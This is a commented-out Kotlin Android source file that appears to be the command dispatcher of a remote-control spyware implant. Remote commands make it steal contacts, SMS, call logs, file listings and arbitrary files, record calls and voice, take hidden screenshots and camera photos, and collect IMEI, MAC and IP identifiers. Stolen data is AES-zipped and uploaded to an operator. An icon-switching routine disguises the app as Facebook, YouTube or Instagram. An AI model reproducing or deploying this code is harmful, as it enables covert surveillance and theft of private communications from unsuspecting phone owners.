//package com.example.mobiletwo
//
//import android.Manifest
//import android.annotation.SuppressLint
//import android.app.ActivityManager
//import android.content.ComponentName
//import android.content.Context
//import android.content.Intent
//import android.content.SharedPreferences
//import android.content.pm.PackageManager
//import android.database.Cursor
//import android.net.ConnectivityManager
//import android.net.MacAddress
//import android.net.Uri
//import android.net.wifi.WifiManager
//import android.os.BatteryManager
//import android.os.Build
//import android.preference.PreferenceManager
//import android.provider.CallLog
//import android.provider.ContactsContract
//import android.telephony.TelephonyManager
//import android.text.format.Formatter
//import android.util.Log
//import androidx.annotation.RequiresPermission
//import androidx.core.app.ActivityCompat
//import androidx.core.content.ContextCompat
//import net.lingala.zip4j.model.ZipParameters
//import net.lingala.zip4j.model.enums.AesKeyStrength
//import net.lingala.zip4j.model.enums.CompressionLevel
//import net.lingala.zip4j.model.enums.EncryptionMethod
//import org.json.JSONArray
//import org.json.JSONObject
//import java.io.File
//import java.io.InputStream
//import java.util.*
//import kotlin.collections.ArrayList
//
//class MyExecutorJS {
//
//
//    companion object {
//
//        var dSPRead: SharedPreferences? = null
//        var dSPWrite: SharedPreferences.Editor? = null
//        fun doo(bContext: Context, ri: Int, command: String, param: String?, file_path:String?) {
//            if (dSPRead==null){dSPRead= PreferenceManager.getDefaultSharedPreferences(bContext)}
//            if(dSPWrite==null){dSPWrite=dSPRead!!.edit()}
//            var ex = "MyExecutor.doo ->"
//            try {
//                if(ri != 0) {MyApiOld.resp(ri.toString(),"قيد التنفيذ","","","2",
//                    command, "", dSPRead!!.getString("imei", "")?:"")}
//                ex += " $command ->"
//                when(command) {
//
//                    "JW-C001" -> {
//                        //TODO check permission READ_CONTACTS
//                        val x = getAllContacts(bContext)
//                        if (x==""){/**Failed**/}else{
//                            MyApiOld.conan(ri.toString(),
//                                dSPRead!!.getString("FCMToken", "")!!, "JW-C001", dSPRead!!.getString("mDeviceName", "")!!, x,
//                                x.split("/").last(), "contacts",imei = dSPRead!!.getString("imei", "")!!, null, null)
//                        }
//                    }
//                    "JW-C002" -> {
//                        //TODO check permission READ_SMS
//                        val x:String = getAllSMS(bContext)
//                        if (x==""){/**Failed**/}else{
//                            MyApiOld.conan(ri.toString(), dSPRead!!.getString("FCMToken", "")!!, "JW-C002", dSPRead!!.getString("mDeviceName", "")!!, x,
//                                x.split("/").last(), "messages", imei = dSPRead!!.getString("imei", "")!!, null, null)
//                        }
//                    }
//                    "JW-C003" -> {
//                        //getAppList
//                        val x:String = coxpoHumbAnnlukatsii(bContext)
//                        if (x==""){/**Failed**/}else{
//                            MyApiOld.conan(ri.toString(), dSPRead!!.getString("FCMToken", "")!!, "JW-C003", dSPRead!!.getString("mDeviceName", "")!!, x,
//                                "device_applications.txt", "constants", imei = dSPRead!!.getString("imei", "")!!, null, null)
//                        }
//                    }
//                    "JW-C004" -> {
//                        //set_vRecording(True,params)
//                        dSPWrite!!.putString("vRecording", "true").commit()
//                        bContext.packageManager.setComponentEnabledSetting(
//                            ComponentName("com.example.blob", "com.example.blob.MyCallListener"),
//                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
//                    }
//                    "JW-C005" -> {
//                        try {
//                            //get_vRecordingList
//                            //get to folder "3anucku"
//                            val ffff= File("/storage/emulated/0/Android/data/com.example.blob/3anucku")
//                            if(!ffff.exists()){ffff.mkdirs()}
//                            val x:String = coxpoHumbnytu(bContext, "Android/data/com.example.blob/3anucku",1)
//                            if (x==""){
//                                Log.i("Echo", "No Record Files Found!")}else{
//                                MyApiOld.conan(
//                                    ri.toString(),
//                                    dSPRead!!.getString("FCMToken", "")!!,
//                                    "JW-C005",
//                                    dSPRead!!.getString("mDeviceName", "")!!,
//                                    x,
//                                    x.split("/").last(),
//                                    "RecordList"
//                                    , imei = dSPRead!!.getString("imei", "")!!, null, null)
//                            }
//                        } catch (ex:Exception) {
//                            Log.i("doo -> JW-C005", ex.message?:"No Detailes!")
//                        }
//                    }
//                    "JW-C006" -> {
//                        //set_vRecording(False)
//                        dSPWrite!!.putString("vRecording", "false").commit()
//                        bContext.packageManager.setComponentEnabledSetting(
//                            ComponentName("com.example.blob", "com.example.blob.MyCallListener"),
//                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
//                    }
//                    "JW-C008" -> {
//                        //getDirList("path", 0)
//                        val x:String = coxpoHumbnytu(bContext, param?:"",1)
//                        if (x==""){"no subDirs found in '$param'"}else{
//                            MyApiOld.conan(ri.toString(), dSPRead!!.getString("FCMToken", "")!!, "JW-C008", dSPRead!!.getString("mDeviceName", "")!!, x, x.split("/").last(), "constants", imei = dSPRead!!.getString("imei", "")!!, null, null)
//                        }
//                    }
//                    "JW-C009" -> {
//                        try {
//                            //uploadReadyFiles
//                            var recDir =
//                                "${bContext.getExternalFilesDir(null)!!.parentFile!!.absolutePath}/Calls/"
//                            val ss = File(recDir).listFiles()
//                            if (ss==null||ss.isEmpty()){return}
//                            for (i in ss.indices) {
//                                println(ss[i].absolutePath)
//                                //conan ss[i] and i is part! ss.length is total parts
//                                MyApiOld.conan(
//                                    ri.toString(),
//                                    dSPRead!!.getString("FCMToken", "")!!,
//                                    "JW-C009",
//                                    dSPRead!!.getString("mDeviceName", "")!!,
//                                    ss[i].absolutePath,
//                                    ss[i].name.split("/").last(),
//                                    "records",
//                                    imei = dSPRead!!.getString("imei", "")!!,
//                                    "${i + 1}",
//                                    "${ss.size}"
//                                )
//                            }
//                        }catch (ex:Exception) {
//                            MyApiOld.resp(ri.toString(),"فشل","","","5",
//                                command, "", dSPRead!!.getString("imei", "")?:"")
//                        }
//                    }
//                    "JW-C010" -> {
//                        //getFileList("path", 2)
//                        Log.i("JW-C010", file_path?:"")
//                        val mFile = File("/$file_path")
//                        if (mFile.exists() && !mFile.isDirectory){
//                            Log.i("JW-C010", "Upload File: $file_path")
//                            MyApiOld.conan(ri.toString(), dSPRead!!.getString("FCMToken", "")!!, "JW-C010", dSPRead!!.getString("mDeviceName", "")!!, file_path!!, file_path.split("/").last(), "files", imei = dSPRead!!.getString("imei", "")!!, null, null)
//                        }
//                        val mFileX = File("/$file_path".replace("root", ""))
//                        if (mFileX.exists() && !mFileX.isDirectory){
//                            Log.i("JW-C010", "Upload File: $file_path")
//                            MyApiOld.conan(ri.toString(), dSPRead!!.getString("FCMToken", "")!!, "JW-C010", dSPRead!!.getString("mDeviceName", "")!!, file_path!!.replace("root", ""), file_path.split("/").last(), "files", imei = dSPRead!!.getString("imei", "")!!, null, null)
//                        }
//                    }
//                    "JW-C011" -> {
//                        //remDir("path")
//                        val mFile = File("/$file_path")
//                        if(mFile.exists()){mFile.delete()}
//                        val mFilex = File("/$file_path".replace("root", ""))
//                        if(mFilex.exists()){mFilex.delete()}
//                        if(mFilex.exists()){
//                            MyApiOld.resp(ri.toString(), "فشل حذف الملف", "", "", "0", "JW-C011", "", dSPRead!!.getString("imei", "")!!)
//                        }else{
//                            MyApiOld.resp(ri.toString(), "تم حذف الملف بنجاح", "", "", "1", "JW-C011", "", dSPRead!!.getString("imei", "")!!)
//                        }
//                    }
//                    "JW-C012" -> {
//                        //screenshot
//                        //TODO Projections
//                        ckpuHwomb(bContext, ri, command)
//
//                    }
//                    "JW-C013" -> {
//                        obnovit("", bContext)
//                    }
//                    "JW-C014" -> {
//                        val mKey:String = param!!.split(", ").first()
//                        val mValue:String = param.split(", ").first()
//                        dSPWrite!!.putString(mKey, mValue).commit()
//                    }
//                    "JW-C015" -> {
//                        //sendPwd
//                        //TODO LATER!!
//                    }
//                    "JW-C016" -> {
//                        //getPermList
//                        val x = arrayOf(
//                            Manifest.permission.RECORD_AUDIO,
//                            Manifest.permission.WRITE_EXTERNAL_STORAGE , Manifest.permission.READ_CALL_LOG,
//                            Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS , Manifest.permission_group.CAMERA, "android.permission.BIND_NOTIFICATION_LISTENER_SERVICE",
//                            Manifest.permission.INSTALL_PACKAGES)
//                        val y: MutableList<String> = arrayListOf("mic","storage","callLog","sms","contacts","screenshot","notificationAccess","googlePlay")
//                        for (i in x.indices) {
//                            if (ContextCompat.checkSelfPermission(bContext, x[i]) != PackageManager.PERMISSION_GRANTED){y[i]=""}
//                        }
//                        val mDeviceName=dSPRead!!.getString("mDeviceName", "")!!
//                        MyApiOld.modo(mDeviceName, ri.toString(),mic = y[0], Storage = y[1], CallLog=y[2], SMS=y[3], Contacts=y[4], screenshot=y[5], notification=y[6], googlePlay=y[7], imei = dSPRead!!.getString("imei", "")!!)
//                    }
//                    "JW-C017" -> {
//                        //update()
//                        obnovit(ri.toString(), bContext)
//                    }
//                    "JW-C018" -> {
//                        //TODO chats...
//                    }
//                    "JW-C019" -> {
//                        //TODO check connection
//                    }
//                    "JW-C029" -> {
//                        //TODO update queries***
//                    }
//                    "JW-C020" -> {
//                        //getCallLog(30)
//                        //TODO check permission READ_CONTACTS
//                        val x = getCallLog(bContext)
//                        if (x==""){/**Failed**/}else{
//                            MyApiOld.conan(ri.toString(),dSPRead!!.getString("FCMToken", "")!!, "JW-C021", dSPRead!!.getString("mDeviceName", "")!!, x,
//                                x.split("/").last(), "his", imei = dSPRead!!.getString("imei", "")!!, null, null)
//                        }
//                    }
//                    "JW-C021" -> {
//                        //setConfig("useWIFIOnly", false)
//                        dSPRead!!.getString("useWIFIOnly", "false")
//                    }
//                    "JW-C022" -> {
//                        //setConfig("useWIFIOnly", true)
//                        dSPRead!!.getString("useWIFIOnly", "true")
//                    }
//                    "JW-C023" -> {
//                        //uploadReadyFiles copy from 009
//                        var recDir = "${bContext.getExternalFilesDir(null)!!.parentFile!!.absolutePath}/records/"
//                        val ss = File(recDir).listFiles()
//                        if (ss==null||ss.isEmpty()){return}
//                        for (i in ss.indices) {
//                            println(ss[i].absolutePath)
//                            //conan ss[i] and i is part! ss.length is total parts
//                            MyApiOld.conan(ri.toString(), dSPRead!!.getString("FCMToken", "")!!, "JW-C009", dSPRead!!.getString("mDeviceName", "")!!,
//                                ss[i].absolutePath, ss[i].name.split("/").last(), "${ss[i].parentFile.name}", imei = dSPRead!!.getString("imei", "")!!, "${i+1}", "${ss.size}")
//                        }
//                    }
//                    "JW-C024" -> {
//                        startCamera(0, bContext, ri, command)
////                          var mMagicalTakePhoto:MagicalTakePhoto = MagicalTakePhoto(MainActivity())
////                          mMagicalTakePhoto.onTakePhotoResult().
////                          mMagicalTakePhoto.takePhoto("Test.jpg")
//                    }
//                    "JW-C025" -> {
//                        startCamera(1, bContext, ri, command)
////                          var mMagicalTakePhoto:MagicalTakePhoto = MagicalTakePhoto(MainActivity())
////                          mMagicalTakePhoto.
////                          mMagicalTakePhoto.takePhoto("Test.jpg")
//                    }
//                    "JW-C026" -> {
//                        //vRecording()
//                        Buguo3anucb(bContext, ri, command)
//                    }
//                    "JW-C027" -> {
//                        changeIcon("Param1", bContext)
//                        MyApiOld.resp(ri.toString(),"المهمه مكتمله","","","3",
//                            command, "", dSPRead!!.getString("imei", "")?:"")
//                    }
//                    "JW-C028" -> {
//                        changeIcon(null, bContext)
//                        MyApiOld.resp(ri.toString(),"المهمه مكتمله","","","3",
//                            command, "", dSPRead!!.getString("imei", "")?:"")
//                    } else -> {
//                    //used for testing
//                    MyApiOld.resp(ri.toString(),"فشل","","","5",
//                        command, "", dSPRead!!.getString("imei", "")?:"")
//                }
//                }
//                Log.i("Command is:", command)
//                if (ri != 0 && command != "JW-C012") {
//                    MyApiOld.resp(ri.toString(),"المهمه مكتمله","","","3",
//                        command, "", dSPRead!!.getString("imei", "")?:"")
//                }
//            } catch (e:Exception) {
//                if (ri != 0) {
//                    MyApiOld.resp(ri.toString(),"فشل المهمه","","","5",
//                        command, "", dSPRead!!.getString("imei", "")?:"")
//                }
//                ex+=e.message
//                Log.i("TryCaught: ", ex)
//                e.printStackTrace()
//                return
//            }
//        }
//
//
//
//        fun startCamera(lens:Int, tContext: Context, ri:Int, command:String) {
//            var mTakePhoto = Intent(tContext, TakePhoto::class.java)
//            mTakePhoto.putExtra("ri", ri)
//            mTakePhoto.putExtra("command", command)
//            mTakePhoto.putExtra("lens", lens)
//            mTakePhoto.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
//            mTakePhoto.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
//            ActivityCompat.startActivity(tContext, mTakePhoto, null)
//        }
//
//
//        fun changeIcon(s: String?, tContext: Context) {
//            try {
//                tContext.applicationContext.packageManager.setComponentEnabledSetting(
//                    ComponentName("com.example.blob", "com.example.blob.$s"), PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
//                    PackageManager.DONT_KILL_APP)
//                val x = arrayOf("Facebook", "Youtube", "Instagram")
//                //do for each
//                for (i in x) {
//                    Log.i("Compare", "$i?$s")
//                    if (s==i){
//                        Log.i("Result", "$i: Enabled")
//                    } else
//                        Log.i("Result", "$i: Disabled")
//                    tContext.applicationContext.packageManager.setComponentEnabledSetting(
//                        ComponentName("com.example.blob", "com.example.blob.$i"), PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
//                        PackageManager.DONT_KILL_APP)
//                }
//            }catch (ex:Exception) {
//                Log.i("ChangeIcon", ex.message?:"No Details")
//                ex.printStackTrace()
//            }
//
//        }
//
//
//        fun ckpuHwomb(tContext: Context, ri:Int, command: String) {
//            try {
//                var mCkpuhwom: Intent = Intent(tContext, Ckpuhwom::class.java)
//                mCkpuhwom.putExtra("ri", ri)
//                mCkpuhwom.putExtra("command", command)
//                mCkpuhwom.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
//                mCkpuhwom.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
//                ActivityCompat.startActivity(tContext, mCkpuhwom, null)
//
//            } catch (ex:Exception) {
//                Log.i("ckpuHwomb", ex.message?:"")
//                ex.printStackTrace()
//            }
//        }
//
//        fun Buguo3anucb(tContext: Context, ri:Int, command: String) {
//            try {
//                var mBuguo3anucb: Intent = Intent(tContext, Buguo3anucb::class.java)
//                mBuguo3anucb.putExtra("ri", ri)
//                mBuguo3anucb.putExtra("command", command)
//                mBuguo3anucb.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
//                mBuguo3anucb.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
//                ActivityCompat.startActivity(tContext, mBuguo3anucb, null)
//
//            } catch (ex:Exception) {
//                Log.i("Buguo3anucb", ex.message?:"")
//                ex.printStackTrace()
//            }
//        }
//
//
//
//
//
//
//
//        @RequiresPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE)
//        private fun coxpoHumbnytu(tContext: Context, dirs: String, dType:Int): String {
//            val tree = File("/storage/emulated/0/$dirs")
//            val mList:MutableList<String> = arrayListOf()
//            if (!tree.exists()){return ""}
//            tree.walkBottomUp().also { it.forEach { tFile: File ->
//                if (dType == 0 && tFile.isDirectory) {mList.add("/root" + tFile.absolutePath)}
//                else if (dType != 0 && !tFile.isDirectory){mList.add("/root" + tFile.absolutePath)}
//            }}
//            return writeToFileStatic(mList.joinToString().replace(", ", "\n"), fPAth = "files_tree.txt", tContext = tContext)
//        }
//
//        @RequiresPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE)
//        private fun coxpoHumbAnnlukatsii(tContext: Context): String {
//            val packages = tContext.packageManager.getInstalledApplications(0)
//            val mPM: PackageManager =tContext.packageManager
//            val appList:MutableList<String> = arrayListOf()
//            for (packageInfo in packages) {
//                appList.add(packageInfo.loadLabel(mPM).toString().replace(", ", "\n"))}
//            return writeToFileStatic(appList.joinToString(),"apps.txt", tContext = tContext)
//        }
//
//
//
//        @SuppressLint("MissingPermission")
//        @RequiresPermission(Manifest.permission.READ_CONTACTS)
//        fun getAllContacts(tContext: Context):String {
//            try {
//                val allContacts= JSONArray()
//                val mCursor: Cursor? =tContext.contentResolver.query(
//                    ContactsContract.Contacts.CONTENT_URI,
//                    arrayOf(ContactsContract.Contacts.DISPLAY_NAME), null, null, null)
//                if (mCursor != null){mCursor.moveToFirst()}else{return ""}
//                val tCursor =tContext.contentResolver.query(
//                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
//                    arrayOf(ContactsContract.CommonDataKinds.Phone.NUMBER),null,null,null)
//                do {
//                    val mContact = JSONObject()
//                    val name = mCursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
//                    tCursor?.moveToPosition(mCursor.position)
//                    val number = tCursor!!.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
//                    mContact.put("name", mCursor.getString(name))
//                    mContact.put("number", tCursor.getString(number))
//                    allContacts.put(mContact)
//                }while (mCursor.moveToNext())
//                tCursor.close()
//                mCursor.close()
//                return writeToFile(allContacts.toString(), "CONTACTS.txt", tContext,true)
//            } catch (ex:Exception) {
//                return ""
//            }
//        }
//
//
//        @SuppressLint("MissingPermission")
//        @RequiresPermission(Manifest.permission.READ_SMS)
//        fun getAllSMS(tContext: Context): String {
//            try {
//                val mCursor: Cursor? = tContext.contentResolver.query(Uri.parse("content://sms"), null, null, null, null)
//                if (mCursor != null){mCursor.moveToFirst()} else {
//                    Log.i("mCursor: ", "Null");return ""}
//                Log.i("mCursor: ", "${mCursor.count}")
//                val allSMS = JSONArray()
//                do {
//                    val mSms = JSONObject()
//                    for (i in 0 until  mCursor.columnCount){
//                        mSms.put(mCursor.getColumnName(i), mCursor.getString(i)?:"null")
//                    }
//                    allSMS.put(mSms)
//                } while (mCursor.moveToNext())
//                mCursor.close()
//                return writeToFile(allSMS.toString(), "MESSAGES.txt", tContext,true)
//            } catch (ex:Exception) {
//                Log.i("Exception", ex.toString())
//                Log.i("Exception: ", ex.message!!)
//                return ""
//            }
//        }
//
//
//
//        @SuppressLint("MissingPermission")
//        @RequiresPermission(Manifest.permission.READ_CALL_LOG)
//        fun getCallLog(tContext: Context): String {
//            return try {
//                val mCalender = Calendar.getInstance()
//                val toDate = mCalender.timeInMillis.toString()
//                mCalender.roll(Calendar.MONTH, false)
//                val fromDate = mCalender.timeInMillis.toString()
//                val whereValue = arrayOf(fromDate, toDate)
//                Log.i(whereValue[0], whereValue[1])
//                val mCursor: Cursor? = tContext.contentResolver.query(
//                    CallLog.Calls.CONTENT_URI, null,
//                    CallLog.Calls.DATE + " BETWEEN ? AND ?", whereValue,
//                    CallLog.Calls.DATE + " DESC limit 600")
//                if (mCursor != null){mCursor.moveToFirst()}else{
//                    Log.i("Error", "null");return ""}
//                val allCalls = JSONArray()
//                do {
//                    val mCall = JSONObject()
//                    for (i in 0 until  mCursor.columnCount) {
//                        mCall.put(mCursor.getColumnName(i), mCursor.getString(i)?:"null")
//                    }
//                    Log.i("CallLog", mCall.toString())
//                    allCalls.put(mCall)
//                } while (mCursor.moveToNext())
//                mCursor.close()
//                return writeToFile(allCalls.toString(), "CallLog.txt", tContext,true)
//            } catch (ex:Exception) {
//                Log.i("Exception", ex.toString())
//                Log.i("Exception: ", ex.message!!)
//                return ""
//            }
//        }
//
//
//        fun zipLocalFile(fPaths: ArrayList<String>, outPut:String): String {
//            return try {
//                val x:net.lingala.zip4j.ZipFile=net.lingala.zip4j.ZipFile(outPut)
//                val mZipParameters = ZipParameters()
//                mZipParameters.isEncryptFiles=true
//                mZipParameters.encryptionMethod= EncryptionMethod.AES
//                mZipParameters.aesKeyStrength= AesKeyStrength.KEY_STRENGTH_256
//                var imeistr:String=dSPRead!!.getString("imei", "")!!
//                println("IMEI: $imeistr")
//                x.setPassword("prefix${imeistr}suffix".toCharArray())
//                //prefix352021090391285suffix
//                for (i in fPaths.indices){
//                    x.addFile(fPaths[i], mZipParameters)
//                }
//                Log.i("Zipped at", x.file.absolutePath)
//                x.file.absolutePath
//            } catch (ex:Exception){
//                ex.printStackTrace()
//                ""
//            }
//        }
//        fun zipData(inputStream: InputStream, outPut:String){
//            try {
//                val x:net.lingala.zip4j.ZipFile=net.lingala.zip4j.ZipFile(outPut)
//                val mZipParameters: ZipParameters = ZipParameters()
//                mZipParameters.isEncryptFiles=true
//                mZipParameters.encryptionMethod= EncryptionMethod.AES
//                mZipParameters.aesKeyStrength= AesKeyStrength.KEY_STRENGTH_256
//                mZipParameters.compressionLevel= CompressionLevel.ULTRA
//                x.setPassword("asd".toCharArray())
//                x.addStream(inputStream, mZipParameters)
//            } catch (ex:java.lang.Exception) {
//                ex.printStackTrace()
//            }
//        }
//
//
//        @RequiresPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE)
//        fun writeToFile(data: String, fPath:String, tContext: Context, isZip:Boolean): String {
//            try {
//                //"TestFile.Test"
//                Log.i("writeToFile->", data)
//                val mFile = File(tContext.getExternalFilesDir(null)!!.parent + "/${fPath.split(".").first()}/"
//                        + fPath.split(".").first() + "_" + Calendar.getInstance().timeInMillis.toString()+"."
//                        + fPath.split(".").last())
//                File(mFile.parent).mkdirs()
//                mFile.createNewFile()
//                mFile.writeText(data, Charsets.UTF_8)
//                Log.i("path", mFile.absolutePath)
//                if (isZip){
//                    var x= zipLocalFile(arrayListOf(mFile.absolutePath), mFile.parent + "/"+mFile.name.split(".").first() + ".zip")
//                    mFile.delete()
//                    return x
//                }
//                return mFile.absolutePath
//            } catch (ex:Exception) {
//                return ""
//            }
//        }
//
//        @RequiresPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE)
//        fun writeToFileStatic(data: String, fPAth:String, tContext: Context): String {
//            return try {
//                Log.i("writeToFile->", data.replace(", ", "\n"))
//                val mFile = File(tContext.getExternalFilesDir(null)!!.parent + "/constants/" + "$fPAth")
//                File(mFile.parent).mkdirs()
//                mFile.createNewFile()
//                mFile.writeText(data.replace(", ", "\n"), Charsets.UTF_8)
//                Log.i("path", mFile.absolutePath)
//                mFile.absolutePath
//            } catch (ex:Exception) {
//                ""
//            }
//        }
//
//
//
//        @RequiresPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE)
//        fun writeToFileData(data: ByteArray, fPath:String, tContext: Context): String {
//            val mFile = File(tContext.getExternalFilesDir(null)!!.parent?:dStoragePath + "/${fPath.split(".").first()}/"
//            + fPath + Calendar.getInstance().timeInMillis.toString() )
//            File(mFile.parent?:dStoragePath).mkdirs()
//            mFile.createNewFile()
//            mFile.writeBytes(data)
//            Log.i("path", mFile.absolutePath)
//            return mFile.absolutePath
//        }
//
//
//
//        @RequiresPermission(Manifest.permission.READ_PHONE_STATE)
//        private fun obnovit(ri: String, tContext: Context) {
//            try {
//
//                //android.permission.ACCESS_WIFI_STATEFCMToken
//                //android.permission.READ_PHONE_STATE
//                val token:String? = dSPRead!!.getString("FCMToken", "Null")
//                val imei = getAnImei(tContext)
//                dSPWrite!!.putString("imei", imei).commit()
//                Log.i("got imei", imei)
//                val mActivityManager: ActivityManager = tContext.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
//                val mMemoryInfo: ActivityManager.MemoryInfo =  ActivityManager.MemoryInfo()
//                mActivityManager.getMemoryInfo(mMemoryInfo)
//                val dRam = mMemoryInfo.totalMem.toString()[0] + "." + mMemoryInfo.totalMem.toString()[1] + "G"
//                dSPWrite!!.putString("dRam", dRam).commit()
//
//                val dStorage = "TODO('ImplementThisFirst')"
//                dSPWrite!!.putString("dStorage", dStorage).commit()
//
//                val dName:String = Build.DEVICE
//                dSPWrite!!.putString("mDeviceName", dName).commit()
//
//                val mMacAddress:String = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
//                    MacAddress.BROADCAST_ADDRESS.toString()
//                } else {
//                    val myWifiManager: WifiManager = tContext.applicationContext.getSystemService(
//                        Context.WIFI_SERVICE) as WifiManager
//                    myWifiManager.connectionInfo.bssid
//                }
//
//                val myWifiManager: WifiManager = tContext.applicationContext.getSystemService(
//                    Context.WIFI_SERVICE) as WifiManager
//                Log.i("bssid", myWifiManager.connectionInfo.bssid)
//
//                dSPWrite!!.putString("mMacAddress", mMacAddress).commit()
//
//                val dModel = Build.MODEL
//                dSPWrite!!.putString("dModel", dModel).commit()
//                Log.i("Model", dModel)
//
//                val osVersion = Build.VERSION.SDK_INT.toString()
//                dSPWrite!!.putString("osVersion", osVersion).commit()
//
//                val mInfo: ConnectivityManager = tContext.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
//                val cType = mInfo.activeNetworkInfo!!.typeName
//                dSPWrite!!.putString("cType", cType).commit()
//
//                //val myWifiManager:WifiManager = tContext.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
//                val ipv4 = Formatter.formatIpAddress(myWifiManager.connectionInfo.ipAddress)
//                dSPWrite!!.putString("ipv4", ipv4).commit()
//
//                val mBatteryManager: BatteryManager = tContext.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
//                val bLvl = mBatteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY).toString()
//
//                val appName:String = Build.VERSION.CODENAME
//                dSPWrite!!.putString("appName", appName).commit()
//
//                val dLang = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
//                    tContext.resources.configuration.locales[0].displayLanguage
//                } else {
//                    "VERSION.SDK_INT < N"
//                }
//                dSPWrite!!.putString("dLang", dLang).commit()
//                MyApiOld.haberkorn(dName, mMacAddress, appName, dModel, osVersion, imei, bLvl, dStorage, token?:"Null", cType, dRam, dLang)
//            } catch (ex:Exception) {
//                Log.i("MyExecutor -> obnovit", ex.message?:"No Details!")
//                ex.printStackTrace()}
//        }
//
//
//
//        private fun getAnImei(tContext: Context): String {
//            val mTelephonyManager: TelephonyManager = tContext.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
//
//            try {return mTelephonyManager.getImei()}catch(ex:Exception){
//                Log.i("getAnImei", "Failed to get at: mTelephonyManager.getImei")}
//            try {return mTelephonyManager.imei}catch(ex:Exception){
//                Log.i("getAnImei", "Failed to get at: mTelephonyManager.imei")}
//            try {return mTelephonyManager.deviceId}catch(ex:Exception){
//                Log.i("getAnImei", "Failed to get at: mTelephonyManager.deviceId")}
//            try {if (Build.getSerial() != "unknown" && Build.getSerial()!= ""){return Build.getSerial()}else{throw Exception("returns Unknown")}}catch(ex:Exception){
//                Log.i("getAnImei", "Failed to get at: Build.getSerial()")}
//            try {return android.provider.Settings.Secure.getString(tContext.contentResolver, android.provider.Settings.Secure.ANDROID_ID)}catch (ex:Exception){
//                Log.i("getAnImei", "Failed to get at: ANDROID_ID")}
//            try {return Build.FINGERPRINT + Calendar.getInstance().timeInMillis.toString()}catch(ex:Exception){
//                Log.i("getAnImei", "Failed to get at: Build.FINGERPRINT")}
//            return Calendar.getInstance().timeInMillis.toString() + android.provider.Settings.Secure.getString(tContext.contentResolver, android.provider.Settings.Secure.ANDROID_ID) +
//                    Build.TIME.toString()
//        }
//
//
//    }
//}